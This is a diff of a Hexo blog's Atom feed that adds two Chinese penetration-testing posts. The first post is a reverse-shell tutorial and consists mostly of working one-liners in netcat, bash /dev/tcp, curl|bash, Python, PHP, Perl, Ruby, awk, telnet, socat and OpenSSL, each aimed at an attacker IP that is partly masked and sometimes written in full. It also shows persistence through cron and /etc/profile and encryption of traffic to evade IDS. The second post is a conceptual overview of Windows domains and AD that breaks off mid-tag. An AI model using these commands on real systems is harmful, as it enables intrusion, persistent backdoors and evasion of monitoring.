@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2023-08-22T03:15:08.614Z</updated>
+  <updated>2023-08-28T08:33:45.181Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,13 +17,174 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>内网渗透之信息收集</title>
+    <title>内网渗透之反弹shell</title>
+    <link href="http://example.com/2023/08/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%8F%8D%E5%BC%B9shell/"/>
+    <id>http://example.com/2023/08/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%8F%8D%E5%BC%B9shell/</id>
+    <published>2023-08-27T16:00:00.000Z</published>
+    <updated>2023-08-28T08:33:45.181Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前学过的内容，记录一遍。</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>反弹shell，就是攻击机监听在某个TCP&#x2F;UDP端口为服务器，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p><h1 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h1><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。</p><h1 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h1><p>反弹shell通常适用于如下几种情况：<br>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。<br>目标机端口被占用。<br>目标机位于互联网，或IP会动态变化，攻击机无法连接。<br>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知。</p><p>对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p><p>反向连接就是，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序。</p><p>反弹shell的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有netcat，那我们就可以利用netcat反弹shell，如果具有python环境，那我们可以利用python反弹shell。如果具有php环境，那我们可以利用php反弹shell。</p><h1 id="利用netcat反弹shell"><a href="#利用netcat反弹shell" class="headerlink" title="利用netcat反弹shell"></a>利用netcat反弹shell</h1><p>Netcat 是一款简单的Unix工具，使用UDP和TCP协议。 它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。 使用它你可以轻易的建立任何连接。</p><p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure><p>安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。</p><p>攻击机开启本地监听：<br><code>netcat -lvvp 2333</code></p><p>目标机主动连接攻击机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netcat 47.xxx.xxx.72 2333 -e /bin/bash</span><br><span class="line"><span class="comment"># nc &lt;攻击机IP&gt; &lt;攻击机端口&gt; -e /bin/bash</span></span><br></pre></td></tr></table></figure><h1 id="利用bash反弹shell"><a href="#利用bash反弹shell" class="headerlink" title="利用bash反弹shell"></a>利用bash反弹shell</h1><p>使用bash结合重定向方法的一句话反弹shell命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class="line">或</span><br><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;</span></span><br><span class="line"><span class="comment"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span></span><br></pre></td></tr></table></figure><p>命令详解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash -i  <span class="comment"># 产生一个bash交互环境</span></span><br><span class="line">&gt;&amp;       <span class="comment"># 将联合符号前面的内容与后面的内容相结合，然后一起重定向给后者</span></span><br><span class="line">/dev/tcp/47.xxx.xxx.72/2333  </span><br><span class="line"><span class="comment"># Linux环境中所有内容都是以文件的形式存在的，</span></span><br><span class="line"><span class="comment"># 该命令是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</span></span><br><span class="line">0&gt;&amp;1     <span class="comment"># 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容</span></span><br></pre></td></tr></table></figure><p>完整解读：<br>bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash反弹环境。</p><p>攻击机开启监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机<br><code>bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</code></p><h1 id="Curl配合bash反弹shell"><a href="#Curl配合bash反弹shell" class="headerlink" title="Curl配合bash反弹shell"></a>Curl配合bash反弹shell</h1><p>这里的操作借助了Linux中的管道。</p><p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>并开启2333端口监听<br>然后在目标机上执行如下，即可反弹shell：<br><code>curl 47.xxx.xxx.72|bash</code></p><p><code>curl IP|bash</code> 中的IP可以是任意格式的，十进制，十六进制，二进制等。</p><h1 id="将反弹shell命令写入定时任务"><a href="#将反弹shell命令写入定时任务" class="headerlink" title="将反弹shell命令写入定时任务"></a>将反弹shell命令写入定时任务</h1><p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。<br>比如，当前用户名为root，我们就要将下面内容写入到 <code>/var/spool/cron/root</code> 中。(centos系列主机)<br>比如，当前用户名为root，我们就要将下面内容写入到 <code>/var/spool/cron/crontabs/root</code> 中。(Debian&#x2F;Ubuntu系列主机)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span></span><br></pre></td></tr></table></figure><h1 id="将反弹shell的命令写入-x2F-etc-x2F-profile文件"><a href="#将反弹shell的命令写入-x2F-etc-x2F-profile文件" class="headerlink" title="将反弹shell的命令写入&#x2F;etc&#x2F;profile文件"></a>将反弹shell的命令写入&#x2F;etc&#x2F;profile文件</h1><p>将以下的反弹shell命令写入&#x2F;etc&#x2F;profile文件中，&#x2F;etc&#x2F;profile中的内容会在用户打开bash窗口时执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1 &amp;</span><br><span class="line"><span class="comment"># 最后面的&amp;为的是防止管理员无法输入命令</span></span><br></pre></td></tr></table></figure><p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的shell</p><h1 id="利用Socat反弹shell"><a href="#利用Socat反弹shell" class="headerlink" title="利用Socat反弹shell"></a>利用Socat反弹shell</h1><p>Socat是Linux下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，可以看作netcat的加强版。<br><a href="http://brieflyx.me/2015/linux-tools/socat-introduction/">SOCAT 简介</a></p><p>安装socat的方法很简单：<br>Ubuntu等可以直接使用 <code>apt-get install socat</code> 命令进行安装<br>也可在 <a href="http://www.dest-unreach.org/socat/">官网</a> 下源码包</p><p>攻击机开启监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:2333 -</span><br><span class="line">或</span><br><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：<br><code>socat tcp-connect:47.xxx.xxx.72:2333 exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane</code></p><h1 id="利用Telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h1><p>当nc和&#x2F;dev&#x2F;tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以用Telnet反弹shell</p><p>方法一：<br>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>mknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | /bin/bash 1&gt;a</code></p><p>方法二：<br>攻击机需要开启两个本地监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br><span class="line">nc -lvvp 4000</span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：<br><code>telnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000</code></p><p>获得shell后，在攻击机2333端口的终端上输入的命令会在目标机上执行，执行的回显将通过4000端口的终端显示出来。</p><h1 id="利用awk反弹shell"><a href="#利用awk反弹shell" class="headerlink" title="利用awk反弹shell"></a>利用awk反弹shell</h1><p>AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。在众多的Linux发行版本中，都会预装这个应用程序。<br>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>awk &#39;BEGIN&#123;s=&quot;/inet/tcp/0/47.xxx.xxx.72/2333&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#39;</code></p><h1 id="各种脚本反弹shell"><a href="#各种脚本反弹shell" class="headerlink" title="各种脚本反弹shell"></a>各种脚本反弹shell</h1><h2 id="python脚本反弹shell"><a href="#python脚本反弹shell" class="headerlink" title="python脚本反弹shell"></a>python脚本反弹shell</h2><p>当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标主机主动连接攻击机：<br><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.xxx.xxx.72&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p><h2 id="PHP脚本反弹shell"><a href="#PHP脚本反弹shell" class="headerlink" title="PHP脚本反弹shell"></a>PHP脚本反弹shell</h2><p>当目标主机上有phph环境时，我们可以用php来反弹shell。</p><p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>php -r &#39;$sock=fsockopen(&quot;47.xxx.xxx.72&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><h2 id="Perl脚本反弹shell"><a href="#Perl脚本反弹shell" class="headerlink" title="Perl脚本反弹shell"></a>Perl脚本反弹shell</h2><p>当目标主机上有perl环境时，我们可以用perl来反弹shell。</p><p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>perl -e &#39;use Socket;$i=&quot;47.101.57.72&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></p><h2 id="Ruby脚本反弹shell"><a href="#Ruby脚本反弹shell" class="headerlink" title="Ruby脚本反弹shell"></a>Ruby脚本反弹shell</h2><p>当目标主机上有ruby环境时，我们可以用ruby来反弹shell。</p><p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>ruby -rsocket -e &#39;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39; 或 ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</code></p><h1 id="使用Metasploit生成反弹shell用的一句话"><a href="#使用Metasploit生成反弹shell用的一句话" class="headerlink" title="使用Metasploit生成反弹shell用的一句话"></a>使用Metasploit生成反弹shell用的一句话</h1><p>强大的Metasploit框架也为我们提供了生成一句话反弹shell的工具，即msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用 <code>msfvenom -l</code> 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p><p>我们可以直接使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd&#x2F;unix&#x2F;reverse），列出我们需要生成的各类反弹shell一句话的payload：<br><code>msfvenom -l payloads | grep &#39;cmd/unix/reverse&#39;</code></p><p>metasploit支持生成反弹shell一句话的类型非常丰富，可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话：<br><code>msfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw</code></p><p>将生成的python反弹shell的一句话在目标主机上执行即可</p><h1 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a>反弹shell后获取模拟终端</h1><p>其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p><ul><li>获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</li><li>标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</li><li>获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</li></ul><p>这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p><p>我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。</p><p>只需在获取的shell里面输入如下命令，即可模拟一个终端设备：<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p><img src="/simg/shell-1.png" alt="模拟终端设备"></p><p>如上图所示，成功模拟在shell中出了一个终端设备，并成功执行了sudo等命令。</p><h1 id="使用OpenSSL反弹加密shell"><a href="#使用OpenSSL反弹加密shell" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h1><p>在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是所有的流量都是明文传输的。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p><h2 id="OpenSSL简介"><a href="#OpenSSL简介" class="headerlink" title="OpenSSL简介"></a>OpenSSL简介</h2><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。</p><p>SSL协议要求建立在可靠的传输层协议(TCP)之上。SSL协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET等)能透明地建立于SSL协议之上。SSL协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。</p><p>在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：<br><code>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</code></p><p>生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可</p><h2 id="使用OpenSSL反弹加密shell-1"><a href="#使用OpenSSL反弹加密shell-1" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h2><p>实验环境：Linux</p><p>目标机：<br>系统：Linux<br>IP：192.168.1.8</p><p>攻击机：<br>系统：Linux<br>IP：47.xxx.xxx.72</p><p>假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：<br><code>openssl s_server -quiet -key key.pem -cert cert.pem -port 2333</code></p><p>此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL&#x2F;TLS server。</p><p>这时在目标机进行反弹 shell 操作，命令为：<br><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quite -connect 47.xxx.xxx.72:2333 &gt; /tmp/s; rm /tmp/s</code></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;以前学过的内容，记录一遍。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="反弹shell" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%8F%8D%E5%BC%B9shell/"/>
+    
+    
+    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows内网渗透之域渗透</title>
+    <link href="http://example.com/2023/08/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
+    <id>http://example.com/2023/08/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%9F%E6%B8%97%E9%80%8F/</id>
+    <published>2023-08-24T16:00:00.000Z</published>
+    <updated>2023-08-25T07:50:01.451Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</p><span id="more"></span><h1 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h1><h2 id="用户组与工作组"><a href="#用户组与工作组" class="headerlink" title="用户组与工作组"></a>用户组与工作组</h2><h3 id="用户-1"><a href="#用户-1" class="headerlink" title="用户"></a>用户</h3><p>Windows系统存在一些为了特定用途而设置的用户，分别是：SYSTEM(系统)、Trustedinstaller(信任程序模块)、Everyone(所有人)、Creator Owner(创建者)等，这些特殊用户不属于任何用户组，是完全独立的账户。其中SYSTEM拥有整台计算机管理权限的账户，一般操作无法获取与它等价的权限。</p><h3 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h3><p>Windows系统内置了许多本地用户组，用于管理用户权限。只要用户账户加入到对应的用户组内，则用户账户也将具备对应用户组所拥有的权限。</p><p>默认情况下，系统为用户分了7个组，并给每个组赋予不同的操作权限。这些组为：管理员组(Administrators)、文件复制组(Replicator)、来宾用户组(Guests)、身份验证用户组(Authenticated Users)。</p><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组(Workgroup)是最常用最简单最普遍的资源管理模式，默认情况下计算机都在名为workgroup的工作组中。工作组模式比较松散，适合网络中计算机数量较少，不需要严格管理的情况。</p><h2 id="域中用户"><a href="#域中用户" class="headerlink" title="域中用户"></a>域中用户</h2><h3 id="域用户"><a href="#域用户" class="headerlink" title="域用户"></a>域用户</h3><p>域环境中的用户和本地用户的账户不同，域用户账户保存在活动目录中。在域环境里，一个域用户可以在域中的任何一台计算机上登录。在域中用户可以使用SID(Security Identifier)来表明身份，用NTLM哈希或者Kerberos来验证身份。</p><h3 id="机器用户"><a href="#机器用户" class="headerlink" title="机器用户"></a>机器用户</h3><p>机器用户也被称作机器账号或计算机账号，所有加入域的主机都会有一个机器用户，机器用户的用户名以 <code>$</code> 结尾。</p><h3 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h3><p>组策略(Group Policy)用于控制用户账户和计算机账户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。其中本地的组策略(LGPO或LocalGPO)，可以在独立且非域的计算机上管理组策略对象。在域环境中的组策略通常被称作GPO(Group Policy Object)。</p><h1 id="内网常用协议"><a href="#内网常用协议" class="headerlink" title="内网常用协议"></a>内网常用协议</h1><p>Windows查询名称解析的顺序为DNS、mDNS、LLMNR、NBNS。</p><h2 id="NetBIOS"><a href="#NetBIOS" class="headerlink" title="NetBIOS"></a>NetBIOS</h2><p>NetBIOS(Network Basic Input&#x2F;Output System)是基于网络的交互协议，通常使用UDP 137、UDP 138、TCP 139等端口。Windows在安装TCP&#x2F;IP协议时会默认启用该协议，可能导致未设置权限校验的网络资源被访问。</p><p>基于NetBIOS有NBNS(NetBIOS Name Service)服务，通常监听在UDP 137端口，该服务提供三种功能：将NetBIOS名称解析到IP、查询某一个NetBIOS节点的状态，注册&#x2F;释放一个NetBIOS名。</p><p>可以使用 <code>nbtstat</code> 工具利用NetBIOS协议管理网络。</p><h2 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h2><p>链路本地多播名称解析(Link-Local Multicast Name Resolution,LLMNR)是一个基于DNS数据包格式的协议，IPv4和IPv6的主机可以通过此协议对同一本地链路上的主机执行名称解析。该协议在Windows Vista后被引入。</p><h2 id="mDNS"><a href="#mDNS" class="headerlink" title="mDNS"></a>mDNS</h2><p>mDNS(multicast DNS)在Windows10中被引入，监听UDP 5353端口，对应的多播地址为224.0.0.251(FF02::FB)。mDNS主要实现了在没有传统DNS服务器的情况下使局域网内的主机实现相互发现和通信。</p><h2 id="WPAD"><a href="#WPAD" class="headerlink" title="WPAD"></a>WPAD</h2><p>网络代理自动发现协议(Web Proxy Auto-Discovery,WPAD)是一种客户端使用DHCP和&#x2F;或DNS发现方法来定位一个配置文件URL的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定URL应使用的代理。</p><h1 id="域"><a href="#域" class="headerlink" title="域"></a>域</h1><p>域指将网络中堕胎计算机逻辑上组织到一起，进行集中管理的逻辑环境。域是组织与存储资源的核心管理单员，在域中，至少有一台域空直接，域控制器中保存着整个域的用户账号和安全数据库。</p><h2 id="域结构"><a href="#域结构" class="headerlink" title="域结构"></a>域结构</h2><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>域树(Trees)由多个域组成，这些域共享同一表结构和配置，形成一个连续的命名空间(namespace)。</p><h3 id="林"><a href="#林" class="headerlink" title="林"></a>林</h3><p>林(Forests)是一个复杂的AD实例，由一个或数个域组成，每个域树都有自己唯一的名称空间。</p><h2 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h2><p>ADDS的目录存储在域控制器(Domain Controller)内，一个域内可以有多台域控制器，每一个域控制器的地位几乎是平等的，有几乎相同地数据库。</p><p>在一台域控制器添加一个用户账户后，这个账户会被自动复制到其他域控制器的数据库中。</p><p>AD数据库有多主机复制模式(Multi-master Replication Model)和单主机复制模式(Sing-master Replication Model)。</p><p>多主机模式可以直接更新任何一台域控制器内的AD对象，并将更新之后的对象复制到其他域控制器，大部分数据都是用多主机模式进行复制。</p><p>单主机复制模式是指由一台被称作操作主机(Operations Master)的域控制器负责接收更改数据的请求，并将数据复制到其他的域控制器。</p><h2 id="信任"><a href="#信任" class="headerlink" title="信任"></a>信任</h2><p>两个域之间需要创建信任关系，才可以访问对应域内的资源。</p><h3 id="域信任类型"><a href="#域信任类型" class="headerlink" title="域信任类型"></a>域信任类型</h3><p>Active Directory的信任方式可以分为以下几种：</p><ul><li>Tree-Root Trust<br>双向具有转移性</li><li>Parent-Child Trust<br>具有转移性，双向行人</li><li>Forest Trust<br>如果两个林创建了信任关系，则林中所有的域都相互信任<br>两个林之间的信任关系无法自动扩展到其他林上</li><li>Realm Trust<br>ADDS域可以和非Windows系统的Kerberos域之间创建信任</li><li>External Trust<br>位于两个林内的域之间可以通过外部信任来创建信任关系</li><li>Shortcut Trust<br>可以缩短验证用户身份的时间</li></ul><h3 id="OU"><a href="#OU" class="headerlink" title="OU"></a>OU</h3><p>组织单位(Organization Unit,OU)是一个容器对象，将域中的对象组织成逻辑组，帮助管理员管理。OU包含用户、计算机、工作组、打印机、安全策略以及其他组织单位等。</p><h1 id="Active-Dirctory"><a href="#Active-Dirctory" class="headerlink" title="Active Dirctory"></a>Active Dirctory</h1><p>活动目录(Active Direcory,AD)是面向Windows Server的目录服务。Active Directory存储了有关网络对象的信息，并且让管理员和用户能够查找和使用这些信息。</p><h2 id="ADDS"><a href="#ADDS" class="headerlink" title="ADDS"></a>ADDS</h2><p>Active Directory提供目录服务的组件被称作Active Directory域服务 (Active Directory Domain Services, ADDS) ，负责目录数据库的存储、增删改查等工作，可以用在多种局域网、广域网的场景中。</p><p>从逻辑上看，ADDS的组件可以分为Partition、Schema、Domain、Domain tree、Forest、OU、Container。</p><p>Partition也被称为naming context，是AD DS数据库的一部分。Schema是存储在 ADDS 中数据的定义。Container是为ADDS提供组织框架的对象。</p><p>从实现上区分，ADDS可以分为Domain controller、Data store、Global catalog server、RODC (Read-only domain controller) 、Site、Subnet。</p><p>每个域控制器都有完整的ADDS数据，每个域控都可以处理数据的修改并同步至其他的域控。</p><p>域控会有一份数据拷贝 (Data store) ，默认存储在 <code>C:\Windows\NTDS</code> 目录下。</p><p>Global catalog server是存储全局catalog的域控，catlog以只读的方式存储了一个multiple-domain forest的所有对象，用于加速搜索。</p><h2 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间"></a>名称空间</h2><p>名称空间(namespace)是一块界定好的区域，在区域内可以用名称找到与之相关的信息。</p><h2 id="对象与属性"><a href="#对象与属性" class="headerlink" title="对象与属性"></a>对象与属性</h2><p>ADDS内的资源都是以对象(Object)的形式存在的，对象通过属性(Attrbute)来描述其特征。</p><h1 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Active Directory证书服务(Active Directory Certificate Services,ADCS)是微软用于实现PKI的服务。</p><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>ADCS中的证书是X.509格式的数字签名文档，用于加密、签名或身份验证等。</p><p>证书常用的属性由下述字段组成</p><ul><li>Subject:主题</li><li>Public Key:公钥</li><li>Extended Key Usages(EKUs):扩展密钥，描述证书的对象标识符(Object identifier,OID)</li></ul><p>常用的EKU OID包括：</p><ul><li><p>代码签名<br>OID 1.3.6.1.5.5.7.3.3<br>证书用于签署可执行代码</p></li><li><p>加密文件系统<br>OID 1.3.6.1.4.1.311.10.3.4<br>证书用于加密文件系统</p></li><li><p>安全电子邮件<br>OID 1.3.6.1.5.5.7.3.4<br>证书用于加密电子邮件</p></li><li><p>客户端身份验证<br>OID 1.3.6.1.5.5.7.3.2</p></li><li><p>智能卡登录<br>OID 1.3.6.1.4.1.311.20.2.2</p></li><li><p>服务器认证<br>OID 1.3.6.1.5.5.7.3.1<br>证书用于识别服务器 (例如HTTPS 证书)</p></li></ul><h2 id="证书模板"><a href="#证书模板" class="headerlink" 